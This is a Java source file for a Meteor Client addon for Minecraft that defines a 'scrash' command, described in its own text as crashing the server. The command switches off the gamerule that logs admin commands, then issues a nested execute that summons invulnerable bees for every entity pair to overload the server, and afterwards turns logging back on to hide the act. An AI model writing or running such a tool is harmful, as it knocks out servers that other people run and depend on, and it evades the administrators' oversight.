package spigey.asteroide.commands;

import com.mojang.brigadier.builder.LiteralArgumentBuilder;
import meteordevelopment.meteorclient.commands.Command;
import net.minecraft.command.CommandSource;
import meteordevelopment.meteorclient.utils.player.ChatUtils;

import static com.mojang.brigadier.Command.SINGLE_SUCCESS;
import static meteordevelopment.meteorclient.MeteorClient.mc;
import static spigey.asteroide.util.perm;

public class ServerCrash extends Command {
    public ServerCrash() {
        super("scrash", "Crashes the server ENABLE BEE NORENDER");
    }

    @Override
    public void build(LiteralArgumentBuilder<CommandSource> builder) {
        builder.executes(context -> {
            error("Remember to disable Bee rendering using NoRender and install the EntityCulling mod!");
            info("Attempting to crash the server");
            assert mc.player != null;
            if(!mc.player.hasPermissionLevel(2)){
                error(perm(2));
            }
            if(mc.player.hasPermissionLevel(2)){
                ChatUtils.sendPlayerMsg("/gamerule logAdminCommands false");
                ChatUtils.sendPlayerMsg("/gamerule sendCommandFeedback false");
            }
            ChatUtils.sendPlayerMsg("/execute as @e as @e run summon bee ~ ~-10 ~ {Invulnerable:1}");
            if(mc.player.hasPermissionLevel(2)){
                ChatUtils.sendPlayerMsg("/save-all");
                ChatUtils.sendPlayerMsg("/gamerule sendCommandFeedback true");
                ChatUtils.sendPlayerMsg("/gamerule logAdminCommands true");
            }
            return SINGLE_SUCCESS;
        });
    }
}
